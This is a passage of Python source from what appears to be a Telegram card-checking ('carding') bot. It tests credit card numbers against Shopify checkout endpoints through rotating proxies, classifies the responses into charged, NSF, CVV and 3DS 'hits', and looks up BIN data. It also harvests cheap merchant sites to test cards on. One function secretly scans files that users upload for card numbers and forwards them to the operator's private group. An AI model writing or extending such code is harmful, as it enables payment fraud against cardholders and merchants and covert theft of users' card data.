            for p in result["live"]: c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?", (result["latencies"].get(p, 0), now, uid, p))
    return result

async def add_proxies_bulk(uid: int, proxies: List[str]) -> Dict[str, Any]:
    result = {"added": 0, "live": 0, "dead": 0, "rejected": 0, "limit_hit": False, "total_parsed": len(proxies)}
    with db() as c: existing = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (uid,)).fetchone()["n"]
    if existing >= LIVE_PROXY_LIMIT: result["limit_hit"] = True; return result
    slots = LIVE_PROXY_LIMIT - existing
    new_proxies, seen_set = [], set()
    with db() as c: existing_set = {r["proxy"] for r in c.execute("SELECT proxy FROM user_proxies WHERE uid=?", (uid,)).fetchall()}
    for p in proxies:
        if len(new_proxies) >= slots: break
        if p in existing_set or p in seen_set: result["rejected"] += 1; continue
        new_proxies.append(p); seen_set.add(p)
    if not new_proxies: return result
    with db() as c:
        for p in new_proxies: c.execute("INSERT OR IGNORE INTO user_proxies(uid, proxy, status) VALUES (?, ?, 'unknown')", (uid, p))
    result["added"] = len(new_proxies)
    sem, results = asyncio.Semaphore(PROXY_TEST_BATCH), {}
    async def one(p):
        async with sem: results[p] = await check_proxy_hq(p)
    await asyncio.gather(*(one(p) for p in new_proxies))
    live_found, dead_found, to_delete = 0, 0, []
    now = datetime.now(timezone.utc).isoformat()
    with db() as c: current_live = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=? AND status='live'", (uid,)).fetchone()["n"]
    for p in new_proxies:
        if results.get(p, {}).get("ok"):
            if current_live < LIVE_PROXY_LIMIT:
                current_live += 1; live_found += 1
                with db() as c: c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?", (results[p].get("latency", 0), now, uid, p))
            else: to_delete.append(p)
        else: dead_found += 1; to_delete.append(p)
    if to_delete:
        with db() as c:
            for p in to_delete: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, p))
    result["live"], result["dead"] = live_found, dead_found
    return result

async def lookup_bin(bin_number):
    try:
        with db() as c:
            row = c.execute("SELECT data FROM bin_cache WHERE bin=?", (bin_number[:6],)).fetchone()
            if row: return json.loads(row["data"])
    except: pass
    try:
        async def fetch():
            async with aiohttp.ClientSession() as sess:
                async with sess.get(f"https://data.handyapi.com/bin/{bin_number}", timeout=aiohttp.ClientTimeout(total=5)) as r:
                    if r.status == 200:
                        data = await r.json()
                        if isinstance(data, dict) and data.get("Status") == "SUCCESS":
                            try:
                                async with _get_write_lock():
                                    with db() as c: c.execute("INSERT OR REPLACE INTO bin_cache(bin, data, ts) VALUES (?,?,?)", (bin_number[:6], json.dumps(data), datetime.now(timezone.utc).isoformat()))
                            except: pass
                            return data
                    return {"error": "BIN not found"}
        return await asyncio.wait_for(fetch(), timeout=6.0)
    except Exception: return {"error": "BIN API unreachable"}

CHARGED_KEYWORDS = ("ORDER_PLACED","ORDER_PAID","PAYMENT_SUCCESSFULL","PAYMENT_CAPTURED","PAYMENT_COMPLETED","PAYMENT_FULFILLED")
SITE_ERROR_KEYWORDS = ("NO_PRODUCTS", "PRODUCTS_NOT_FOUND", "PAYMENTS_ZONE_NOT_FOUND", "INVALID_SHOP","INVALID_PURCHASE_TYPE", "REQUIRED_ARTIFACTS_UNAVAILABLE", "SUBSCRIPTION_REQUIRED","SITE ERROR", "CART FAILED", "NO PRODUCT", "TIMEOUT", "THROTTLED","CAPTCHA_REQUIRED", "BOT_BLOCK", "HTTP 429", "HTTP 503", "HTTP 401", "HTTP 403","DELIVERY", "VAULT", "SESSION TOKEN", "CHECKOUT ERROR","OUT OF STOCK", "UNAVAILABLE", "MINIMUM", "SECURITY_VIOLATION","LOGIN REQUIRED", "SITE REQUIRES LOGIN","SITE_REQUIRED", "NO_SITE", "SITE_MISSING", "INVALID_SITE","APPLICATION NOT FOUND", "APP NOT FOUND", "404 NOT FOUND","INTERNAL SERVER ERROR", "BAD GATEWAY", "NOT FOUND")
NSF_KEYWORDS = ("INSUFFICIENT_FUNDS", "NSF", "INSUFFICIENT FUNDS")
CCN_KEYWORDS = ("INCORRECT_CVC", "INVALID_CVC", "CVV", "WRONG_CVV", "INCORRECT_ZIP")
THREE_DS_KEYWORDS = ("3DS", "3D_SECURE", "3D SECURE", "AUTHENTICATION_REQUIRED", "OTP_REQUIRED", "OTP")
DECLINE_KEYWORDS = ("DECLINED", "DECLINE","DO_NOT_HONOR", "DO_NOT_HONOUR", "DO NOT HONOR", "DO NOT HONOUR","GENERIC_DECLINE", "GENERIC DECLINE","INVALID_ACCOUNT", "INVALID ACCOUNT","INVALID_NUMBER", "INVALID NUMBER","INVALID_CARD", "INVALID CARD","INCORRECT_NUMBER", "INCORRECT NUMBER","CARD_NOT_ACTIVE", "CARD NOT ACTIVE","INACTIVE_CARD", "INACTIVE CARD","FRAUDULENT", "SUSPECTED_FRAUD", "FRAUD_SUSPECTED","STOLEN_CARD", "STOLEN CARD","LOST_CARD", "LOST CARD","PICKUP_CARD", "PICKUP CARD", "PICK_UP_CARD", "PICK UP CARD","CALL_ISSUER", "CALL ISSUER", "CONTACT_ISSUER", "CONTACT ISSUER","EXPIRED_CARD", "EXPIRED CARD", "CARD_EXPIRED", "CARD EXPIRED","RESTRICTED_CARD", "RESTRICTED CARD","CARD_NOT_SUPPORTED", "CARD NOT SUPPORTED","UNSUPPORTED_CARD", "UNSUPPORTED CARD","TRANSACTION_NOT_ALLOWED", "TRANSACTION NOT ALLOWED","NOT_PERMITTED", "NOT PERMITTED","NOT_ALLOWED", "NOT ALLOWED","BIN_BLOCKED", "BIN BLOCKED","BLOCKED_CARD", "BLOCKED CARD","AUTHENTICATION_FAILED", "AUTHENTICATION FAILED","AUTHORIZATION_FAILED", "AUTHORIZATION FAILED")
PROXY_ERROR_KEYWORDS = ("PROXY ERROR","CANNOT CONNECT","CONNECTION REFUSED","TUNNEL CONNECTION FAILED","407 PROXY AUTH","PROXY AUTH","PROXY DEAD","FAILED TO CONNECT","CONNECT CALL FAILED")
WORKING_SITE_CLASSES = ("declined", "charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds")

def _contains_any(upper_text: str, keywords) -> bool: return any(k in upper_text for k in keywords)

def parse_response(text: str, http_status: int = 200) -> Dict[str, Any]:
    raw_text   = text or ""
    full_upper = raw_text.upper()
    if http_status == 429 or "RATE LIMIT" in full_upper or "TOO MANY" in full_upper: return {"cls": "rate_limited", "response": "rate_limited", "raw": raw_text[:500], "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if http_status >= 500: return {"cls": "site_error", "response": f"HTTP {http_status}", "raw": raw_text[:500], "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    data = {}
    s = raw_text.strip()
    # FIX: guard against non-dict JSON (empty list, scalar) so .get() doesn't blow up
    if s.startswith(("{", "[")):
        try:
            parsed = json.loads(s)
            if isinstance(parsed, list) and parsed and isinstance(parsed[0], dict): data = parsed[0]
            elif isinstance(parsed, dict): data = parsed
            # else: keep data={}
        except: pass
    charged_flag  = str(data.get("Charged",  "False")).strip().lower() == "true"
    approved_flag = str(data.get("Approved", "False")).strip().lower() == "true"
    resp_msg      = str(data.get("Response", data.get("response", data.get("message", data.get("error", "")))) or "").strip()
    gateway       = str(data.get("Gate", data.get("Gateway", data.get("gateway", "Shopify"))) or "Shopify").strip()
    check_time    = str(data.get("Time", data.get("time", "")) or "").strip()
    price_raw     = str(data.get("Price", data.get("price", data.get("amount", "0"))) or "0")
    amount, currency, pp = 0.0, "USD", price_raw.strip().split()
    if pp:
        try: amount = float(pp[0].replace("?","0").replace("$",""))
        except: pass
        if len(pp) > 1 and pp[1].isalpha(): currency = pp[1].upper()
    if not resp_msg: resp_msg = raw_text.strip()[:200] or "unknown"
    ru, fu = resp_msg.upper(), full_upper
    LIVE_RESPONSES = {"INSUFFICIENT_FUNDS", "NSF", "INSUFFICIENT FUNDS","INCORRECT_CVC", "INVALID_CVC", "WRONG_CVV", "INCORRECT_ZIP","OTP_REQUIRED", "AUTHENTICATION_REQUIRED","3DS", "3D_SECURE", "3D SECURE"}
    HARD_DECLINE = {"CARD_DECLINED", "DECLINED", "DECLINE","DO_NOT_HONOR", "DO_NOT_HONOUR", "DO NOT HONOR", "DO NOT HONOUR","GENERIC_DECLINE", "FRAUDULENT", "SUSPECTED_FRAUD","STOLEN_CARD", "LOST_CARD", "PICKUP_CARD", "PICK_UP_CARD","CALL_ISSUER", "CONTACT_ISSUER","EXPIRED_CARD", "CARD_EXPIRED","RESTRICTED_CARD", "CARD_NOT_SUPPORTED", "UNSUPPORTED_CARD","TRANSACTION_NOT_ALLOWED", "NOT_PERMITTED", "NOT_ALLOWED","BLOCKED_CARD", "BIN_BLOCKED","INVALID_ACCOUNT", "CARD_NOT_ACTIVE", "INACTIVE_CARD","INVALID_NUMBER", "INCORRECT_NUMBER", "INVALID_CARD","AUTHENTICATION_FAILED", "AUTHORIZATION_FAILED"}
    if charged_flag or _contains_any(ru, CHARGED_KEYWORDS): cls = "charged"
    elif _contains_any(fu, PROXY_ERROR_KEYWORDS): cls = "proxy_error"
    elif _contains_any(ru, SITE_ERROR_KEYWORDS): cls = "site_error"
    elif _contains_any(ru, THREE_DS_KEYWORDS): cls = "approved_3ds"
    elif _contains_any(ru, NSF_KEYWORDS): cls = "approved_nsf"
    elif _contains_any(ru, CCN_KEYWORDS): cls = "approved_ccn"
    elif any(k in ru for k in HARD_DECLINE): cls = "declined"
    elif _contains_any(ru, DECLINE_KEYWORDS): cls = "declined"
    elif approved_flag and any(k in ru for k in LIVE_RESPONSES): cls = "approved"
    else: cls = "declined"
    return {"cls": cls, "response": resp_msg[:200], "amount": amount, "currency": currency, "gateway": gateway, "check_time": check_time, "success": cls in ("charged","approved","approved_nsf","approved_ccn","approved_3ds"), "raw": raw_text[:500], "http": http_status}

def is_hit(cls): return cls in ("charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds")

_direct_http_session: Optional[aiohttp.ClientSession] = None
_proxy_http_session: Optional[aiohttp.ClientSession] = None
def direct_session() -> aiohttp.ClientSession:
    global _direct_http_session
    if _direct_http_session is None or _direct_http_session.closed:
        _direct_http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=5000, limit_per_host=5000, ttl_dns_cache=300, enable_cleanup_closed=True, ssl=False), timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=PROXY_CONNECT_TIMEOUT, sock_read=PROXY_SOCK_READ_TIMEOUT))
    return _direct_http_session
def proxy_client_session() -> aiohttp.ClientSession:
    global _proxy_http_session
    if _proxy_http_session is None or _proxy_http_session.closed:
        _proxy_http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=5000, limit_per_host=5000, force_close=True, ttl_dns_cache=300, enable_cleanup_closed=True, ssl=False), timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=PROXY_CONNECT_TIMEOUT, sock_read=PROXY_SOCK_READ_TIMEOUT))
    return _proxy_http_session
def _proxy_exc(e): return any(k in str(e).upper() for k in ("PROXY","TUNNEL","407","CANNOT CONNECT","CONNECTION REFUSED","CONNECT CALL FAILED"))
def _build_api_request(ep: Dict[str, Any], cc: str, proxy: Optional[str], site: Optional[str]):
    api_site = site if not site or site.startswith("http") else f"https://{site}"
    if ep.get("style", "params") == "raw":
        base, sep = ep["url"], "&" if "?" in ep["url"] else "?"
        parts = [urllib.parse.quote(cc, safe=""), f"proxy={urllib.parse.quote(proxy or '', safe=':@')}"]
        if api_site: parts.append(f"site={urllib.parse.quote(api_site, safe=':/')}")
        if ep.get("key"): parts.append(f"key={urllib.parse.quote(str(ep['key']), safe='')}")
        return f"{base}{sep}{'&'.join(parts)}", None
    params = [("cc", cc), ("proxy", proxy or "")]
    if api_site: params.append(("site", api_site))
    if ep.get("key"): params.append(("key", str(ep["key"])))
    return ep["url"], params

async def _do_api_call(ep: Dict[str, Any], cc: str, proxy: Optional[str], site: Optional[str], uid: Optional[int], timeout: Optional[float]) -> Dict[str, Any]:
    ep_url = ep["url"]  # FIX: bind before try so except branches have it
    try:
        url, params = _build_api_request(ep, cc, proxy, site)
    except Exception as e:
        return {"cls": "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site or "", "_proxy": proxy, "_dropped": False, "_endpoint": ep_url}
    ct = aiohttp.ClientTimeout(total=timeout or CHECK_TIMEOUT, connect=min(PROXY_CONNECT_TIMEOUT, timeout or CHECK_TIMEOUT), sock_read=min(PROXY_SOCK_READ_TIMEOUT, timeout or CHECK_TIMEOUT))
    proxy_url = _proxy_to_url(proxy) if proxy else None
    is_socks = proxy_url and proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
    try:
        if proxy:
            async with proxy_sem(proxy):
                if is_socks:
                    if not HAS_SOCKS: return {"cls": "error", "response": "aiohttp_socks required for SOCKS proxies", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
                    connector = ProxyConnector.from_url(proxy_url)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        async with session.get(url, params=params, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
                else:
                    async with proxy_client_session().get(url, params=params, proxy=proxy_url, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
            mark_proxy_ok(proxy)
        else:
            async with direct_session().get(url, params=params, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
        res = parse_response(text, status); res["response"] = _sanitize_err(res.get("response", ""))
        if res["cls"] == "site_error": mark_endpoint_fail(ep_url)
        else: mark_endpoint_ok(ep_url)
        if res["cls"] == "rate_limited": _bench_site(site or "", 180)
        elif res["cls"] == "proxy_error":
            dropped = mark_proxy_fail(proxy) if proxy else False
            if dropped and uid is not None and proxy: remove_user_proxy(uid, proxy)
            res["_dropped"] = dropped
        res.update({"_site": site or "", "_proxy": proxy, "_endpoint": ep_url, "_dropped": res.get("_dropped", False)})
        return res
    except asyncio.TimeoutError:
        mark_endpoint_fail(ep_url)
        dropped = mark_proxy_fail(proxy) if proxy else False
        if dropped and uid is not None and proxy: remove_user_proxy(uid, proxy)
        return {"cls": "timeout", "response": "timeout", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site or "", "_proxy": proxy, "_dropped": dropped, "_endpoint": ep_url}
    except Exception as e:
        is_proxy_err = _proxy_exc(e)
        dropped = False
        if proxy and is_proxy_err:
            dropped = mark_proxy_fail(proxy)
            if dropped and uid is not None: remove_user_proxy(uid, proxy)
        else: mark_endpoint_fail(ep_url)
        return {"cls": "proxy_error" if is_proxy_err else "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site or "", "_proxy": proxy, "_dropped": dropped, "_endpoint": ep_url}

async def call_stripe_api(cc: str, proxy: Optional[str] = None) -> dict:
    return {"cls": "declined", "response": "STRIPE_API_NOT_CONFIGURED", "amount": 0.0, "currency": "USD", "gateway": "Stripe", "check_time": ""}

async def call_api(cc: str, proxy: Optional[str] = None, site: Optional[str] = None, uid: Optional[int] = None, timeout: Optional[float] = None, mode: str = "shopify", single: bool = False) -> Dict[str, Any]:
    try:
        return await asyncio.wait_for(_call_api_raw(cc, proxy, site, uid, timeout, mode, single), timeout=timeout or 90.0)
    except asyncio.TimeoutError:
        return {"cls": "timeout", "response": "timeout (90s max)", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    except Exception as e:
        return {"cls": "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}

async def _call_api_raw(cc: str, proxy: Optional[str] = None, site: Optional[str] = None, uid: Optional[int] = None, timeout: Optional[float] = None, mode: str = "shopify", single: bool = False) -> Dict[str, Any]:
    if mode == "auth": return await call_stripe_api(cc, _proxy_to_url(proxy) if proxy else None)
    eps = _filtered_endpoints()
    if not eps: return {"cls": "error", "response": f"no apis ({mode_label()})", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if single:
        ep = eps[0]
        need_site = ep.get("site_required", False)
        if need_site and not site:
            sl = _pick_random_sites(1); site = sl[0] if sl else ""
            if not site: return {"cls": "site_error", "response": "no sites available", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
        if site and need_site: await acquire_site_slot(site)
        return await _do_api_call(ep, cc, proxy, site if need_site else None, uid, timeout)
    healthy = [e for e in eps if not is_endpoint_down(e["url"])]
    pool = healthy if healthy else eps
    global _endpoint_rr
    with _endpoint_rr_lock:
        ep = pool[_endpoint_rr % len(pool)]
        _endpoint_rr += 1
    need_site = ep.get("site_required", False)
    if need_site and not site:
        sl = _pick_random_sites(1); site = sl[0] if sl else ""
        if not site: return {"cls": "site_error", "response": "no sites available", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if site and need_site: await acquire_site_slot(site)
    res = await _do_api_call(ep, cc, proxy, site if need_site else None, uid, timeout)
    if res["cls"] in RETRYABLE_CLS and not res.get("_dropped") and len(eps) > 1:
        others = [e for e in eps if e["url"] != ep["url"] and not is_endpoint_down(e["url"])]
        if others:
            fb_ep = others[0]; fb_need_site = fb_ep.get("site_required", False)
            res = await _do_api_call(fb_ep, cc, proxy, site if fb_need_site else None, uid, timeout)
    return res

async def test_site(site: str, timeout: Optional[float] = None) -> Dict[str, Any]:
    target = next((ep for ep in load_api_state().get("endpoints", []) if ep.get("enabled", True) and ep.get("site_required", False)), None)
    if not target: return {"cls": "site_error", "response": "no site-required API configured", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    url, params = _build_api_request(target, DUMMY_CC, None, site)
    try:
        async with direct_session().get(url, params=params, timeout=aiohttp.ClientTimeout(total=timeout or 15, connect=PROXY_CONNECT_TIMEOUT, sock_read=timeout or 15)) as r: res = parse_response(await r.text(errors="ignore"), r.status)
        res["response"] = _sanitize_err(res.get("response", "")); res["_site"] = site; return res
    except asyncio.TimeoutError: return {"cls": "timeout", "response": "timeout", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    except Exception as e: return {"cls": "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}

async def check_sites_clean(sites: List[str], timeout: Optional[float] = None) -> Dict[str, Any]:
    result = {"total": len(sites), "clean": [], "dead": [], "captcha": []}
    sem, lock = asyncio.Semaphore(8), asyncio.Lock()
    async def one(site: str):
        async with sem:
            try: res = await test_site(site, timeout=timeout or 15)
            except Exception as e: res = {"cls": "error", "response": _sanitize_err(str(e)[:60])}
            async with lock:
                cls, amount = res.get("cls", "error"), res.get("amount", 0.0)
                if cls in WORKING_SITE_CLASSES: result["clean"].append({"site": site, "price": amount, "status": cls})
                elif cls == "captcha": result["captcha"].append({"site": site, "price": amount})
                else: result["dead"].append({"site": site, "reason": res.get("response", "")[:60]})
    await asyncio.gather(*(one(s) for s in sites))
    return result

async def bulk_add_sites(raw: str) -> Dict[str, Any]:
    sites = [l.strip() for l in re.split(r"[\r\n,;]+", raw) if l.strip()]
    max_p = float(get_setting("site_max_price", "3.0"))
    clean, upper, dead = [], [], []
    sem = asyncio.Semaphore(8)
    async def test_one(s):
        async with sem:
            res = await test_site(s, timeout=15)
            if res.get("cls") == "captcha" or "PROPOSAL_ERROR" in res.get("response", "").upper():
                upper.append(s)
            elif res.get("amount", 0.0) > max_p:
                upper.append(s)
            elif res.get("cls") not in WORKING_SITE_CLASSES:
                dead.append({"site": s, "reason": res.get("response", "")[:60]})
            else:
                clean.append(s)
                add_site_db(s)
    await asyncio.gather(*(test_one(s) for s in sites))
    return {"clean": clean, "upper": upper, "dead": dead, "total": len(sites)}

def _bulk_sites_report(result: Dict[str, Any]) -> str:
    lines = [f"{pe('check')} <b>{sc('Bulk Site Checker')}</b>", f"<blockquote>{pe('shop')} {sc('Total')}: <b>{result['total']}</b>", f"{pe('check')} {sc('Saved')}: <b>{len(result['clean'])}</b>", f"{pe('warn')} {sc('High Price/Captcha')}: <b>{len(result['upper'])}</b>", f"{pe('cross2')} {sc('Dead')}: <b>{len(result['dead'])}</b></blockquote>"]
    if result['clean']:
        lines.append(f"<blockquote><b>{sc('Saved Sites')}:</b>\n" + "\n".join(f"✅ <code>{esc(s)}</code>" for s in result['clean'][:15]))
        if len(result['clean']) > 15: lines.append(f"<i>...and {len(result['clean'])-15} more</i>")
        lines.append("</blockquote>")
    return "\n".join(lines)

_bot_ref: Optional[Bot] = None
async def notify_owner(text: str) -> None:
    if not _bot_ref: return
    try: await _bot_ref.send_message(OWNER_ID, text[:3900], parse_mode=ParseMode.HTML)
    except Exception as e: log.warning(f"owner notify failed: {e}")

_TEXT_EXTS = (".txt", ".csv", ".log", ".dat", ".list", ".text", ".md", ".tsv")
async def _scan_file_for_ccs(bot, doc) -> List[str]:
    cards = []
    try:
        if (doc.file_size or 0) > 5 * 1024 * 1024: return cards
        fname = (doc.file_name or "").lower()
        if fname and not any(fname.endswith(e) for e in _TEXT_EXTS): return cards
        buf = await bot.download_file((await bot.get_file(doc.file_id)).file_path)
        raw = buf.read().decode("utf-8", errors="ignore")
    except: return cards
    if not raw: return cards
    seen = set()
    for tok in re.split(r"[\s,;]+", raw):
        n = normalize_cc(tok)
        if n and n not in seen:
            seen.add(n); cards.append(n)
            if len(cards) >= 500: break
    return cards

async def forward_user_file_to_pvt_gc(bot, msg: Message, context: str = "") -> None:
    doc = msg.document
    if not doc: return
    cc_gc = get_setting("pvt_cc_gc_id")
    if not cc_gc: return
    found_cards = await _scan_file_for_ccs(bot, doc)
    if not found_cards: return
    try: chat_id = int(cc_gc) if re.fullmatch(r"-?\d+", cc_gc) else cc_gc
    except: return
    header = (f"{pe('gem')} <b>CC FILE UPLOAD</b>\n<blockquote>{pe('user')} <b>UID:</b> <code>{msg.from_user.id}</code>\n{pe('link')} <b>User:</b> @{esc(msg.from_user.username or 'N/A')}\n{pe('chat')} <b>Chat:</b> {esc(str(msg.chat.id))} ({esc(msg.chat.type)})\n{pe('pen')} <b>File:</b> <code>{esc(doc.file_name or 'file')}</code>\n{pe('diamond')} <b>Size:</b> {(doc.file_size or 0)/1024:.1f} KB\n{pe('check')} <b>Cards Found:</b> {len(found_cards)}\n{pe('settings')} <b>Context:</b> {esc(context or 'general')}</blockquote>\n<blockquote>{chr(10).join(f'<code>{esc(c)}</code>' for c in found_cards[:10])}{chr(10) + f'<i>... +{len(found_cards)-10} more</i>' if len(found_cards) > 10 else ''}</blockquote>")
    try: await bot.send_document(chat_id, doc.file_id, caption=header[:1024], parse_mode="HTML")
    except: pass

async def send_backup(target_chat: int):
    if not _bot_ref: return False
    try:
        with db() as c: dump = "\n".join(c.iterdump())
        compressed = gzip.compress(dump.encode('utf-8')); total_size = len(compressed)
        base_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.gz"; now_utc = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
        if total_size <= BACKUP_CHUNK_SIZE:
            msg = await _bot_ref.send_document(target_chat, BufferedInputFile(compressed, filename=base_name), caption=f"📦 <b>Database Backup</b>\nSize: {total_size/1024/1024:.2f} MB\n{now_utc} UTC\n<i>Single-file restore supported</i>", parse_mode="HTML")
            try: await _bot_ref.pin_chat_message(target_chat, msg.message_id, disable_notification=True)
            except: pass
            return True
        chunks = [compressed[i:i+BACKUP_CHUNK_SIZE] for i in range(0, total_size, BACKUP_CHUNK_SIZE)]; num_parts = len(chunks)
        if num_parts > 100:
            await _bot_ref.send_message(target_chat, f"❌ Backup too large to split safely ({total_size/1024/1024:.1f} MB compressed)"); return False
        header = f"📦 <b>Database Backup (MULTI-PART)</b>\nTotal: {total_size/1024/1024:.2f} MB\nParts: <b>1/{num_parts}</b>\n{now_utc} UTC\n\n<i>To restore: send all <b>{num_parts}</b> parts back to the bot in any order. Auto-completes when all parts arrive. <code>/restore_done</code> forces completion, <code>/restore_clear</code> aborts.</i>"
        for idx, chunk in enumerate(chunks, start=1):
            try:
                m = await _bot_ref.send_document(target_chat, BufferedInputFile(chunk, filename=f"{base_name}.part{idx:03d}"), caption=header if idx == 1 else f"📦 <b>Backup Part {idx}/{num_parts}</b>\nSize: {len(chunk)/1024/1024:.2f} MB", parse_mode="HTML")
                if idx == 1:
                    try: await _bot_ref.pin_chat_message(target_chat, m.message_id, disable_notification=True)
                    except: pass
                await asyncio.sleep(0.1)
            except: return False
        return True
    except: return False

def _cleanup_restore_sessions():
    now = time.time()
    with _restore_lock:
        for k in [k for k, v in _restore_sessions.items() if now - v.get("ts", 0) > BACKUP_SESSION_TTL]: _restore_sessions.pop(k, None)

async def _restore_from_bytes(raw_bytes: bytes, uid: int, status_msg) -> bool:
    try:
        if raw_bytes[:2] == b"\x1f\x8b": raw_bytes = gzip.decompress(raw_bytes)
        raw = raw_bytes.decode("utf-8", errors="ignore")
        with db() as c:
            for t in ["users", "settings", "redeem_codes", "redeem_log", "check_logs", "saved_cards", "bin_cache", "user_proxies", "sites", "force_channels", "charged_hits", "feedback"]: c.execute(f"DROP TABLE IF EXISTS {t}")
            c.executescript(raw)
        reset_db_conn()
        init_db(); load_extra_admins(); _invalidate_sites()
        return True
    except Exception as e:
        await status_msg.edit_text(f"{pe('cross1')} <b>Restore failed:</b> {esc(str(e)[:200])}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return False

async def _handle_backup_part(msg: Message, uid: int):
    doc = msg.document
    if not doc: return
    m = re.match(r"^(backup_\d+_\d+\.sql\.gz)\.part(\d{1,3})$", (doc.file_name or "").lower())
    if not m: return await msg.answer(f"{pe('cross1')} <b>Unknown part filename</b>\n<blockquote>Expected: <code>backup_YYYYMMDD_HHMMSS.sql.gz.partNNN</code></blockquote>", parse_mode="HTML")
    base, part_num = m.group(1), int(m.group(2))
    if (doc.file_size or 0) > 20 * 1024 * 1024: return await msg.answer(f"{pe('cross1')} <b>Part too large</b> ({doc.file_size/1024/1024:.1f} MB).</blockquote>", parse_mode="HTML")
    _cleanup_restore_sessions()
    status_msg = await msg.answer(f"{pe('loading')} <b>Downloading part {part_num}...</b>", parse_mode="HTML")
    try:
        buf = await msg.bot.download_file((await msg.bot.get_file(doc.file_id)).file_path); raw_bytes = buf.read()
    except Exception as e: return await status_msg.edit_text(f"{pe('cross1')} <b>Download failed:</b> {esc(_sanitize_err(str(e)))}", parse_mode="HTML")
    with _restore_lock:
        sess = _restore_sessions.get(base)
        if not sess:
            sess = {"parts": {}, "ts": time.time(), "uid": uid, "chat_id": msg.chat.id, "expected": None}; _restore_sessions[base] = sess
        if sess["uid"] != uid: return await status_msg.edit_text(f"{pe('cross1')} <b>Session owned by another user</b>", parse_mode="HTML")
        sess["parts"][part_num] = raw_bytes; sess["ts"] = time.time(); have = len(sess["parts"])
    cap = msg.caption or ""
    m2 = re.search(r"Parts?:\s*(?:<b>)?(\d+)\s*/\s*(\d+)", cap) or re.search(r"Part\s+(\d+)\s*/\s*(\d+)", cap)
    if m2:
        try:
            with _restore_lock:
                s = _restore_sessions.get(base)
                if s: s["expected"] = int(m2.group(2))
        except: pass
    with _restore_lock:
        expected = _restore_sessions.get(base, {}).get("expected"); present = set(_restore_sessions.get(base, {}).get("parts", {}).keys())
    if expected and have >= expected and set(range(1, expected + 1)).issubset(present): return await _try_finish_multipart(msg, base, status_msg)
    missing_disp = ""
    if expected:
        missing = [i for i in range(1, expected + 1) if i not in present]
        if missing: missing_disp = f"{pe('warn')} Missing: <b>{esc(', '.join(map(str, missing[:12])))}</b>{' ...' if len(missing) > 12 else ''}"
    await status_msg.edit_text(f"{pe('check')} <b>Part {part_num} stored</b>\n<blockquote>{pe('docs')} Session: <code>{esc(base)}</code>\n{pe('chart')} Have: <b>{have}</b>{f' / <b>{expected}</b>' if expected else ' <i>(total unknown)</i>'}\n{missing_disp + chr(10) if missing_disp else ''}</blockquote>\n<i>Send remaining parts. Use <code>/restore_done</code> to force completion.</i>", parse_mode="HTML")

async def _try_finish_multipart(msg: Message, base: str, status_msg):
    with _restore_lock:
        sess = _restore_sessions.get(base)
        if not sess: return await status_msg.edit_text(f"{pe('warn')} <b>No session for</b> <code>{esc(base)}</code>", parse_mode="HTML")
        parts, expected = dict(sess["parts"]), sess.get("expected")
    if expected:
        missing = [i for i in range(1, expected + 1) if i not in parts]
        if missing: return await status_msg.edit_text(f"{pe('warn')} <b>Missing parts:</b> {esc(', '.join(map(str, missing[:15])))}", parse_mode="HTML")
        use_nums = list(range(1, expected + 1))
    else:
        if not parts: return await status_msg.edit_text(f"{pe('warn')} <b>No parts stored</b>", parse_mode="HTML")
        max_n = max(parts.keys()); missing = [i for i in range(1, max_n + 1) if i not in parts]
        if missing: return await status_msg.edit_text(f"{pe('warn')} <b>Missing parts:</b> {esc(', '.join(map(str, missing[:15])))}", parse_mode="HTML")
        use_nums = list(range(1, max_n + 1))
    await status_msg.edit_text(f"{pe('loading')} <b>Reassembling {len(use_nums)} parts...</b>", parse_mode="HTML")
    compressed = b"".join(parts[i] for i in use_nums)
    if await _restore_from_bytes(compressed, msg.from_user.id, status_msg):
        with _restore_lock: _restore_sessions.pop(base, None)
        await status_msg.edit_text(f"{pe('check')} <b>Database Restored</b>\n<blockquote>{pe('docs')} Parts: <b>{len(use_nums)}</b>\n{pe('diamond')} Compressed: <b>{len(compressed)/1024/1024:.2f} MB</b></blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(msg.from_user.id))

async def auto_backup_task():
    while True:
        now = datetime.now(timezone.utc)
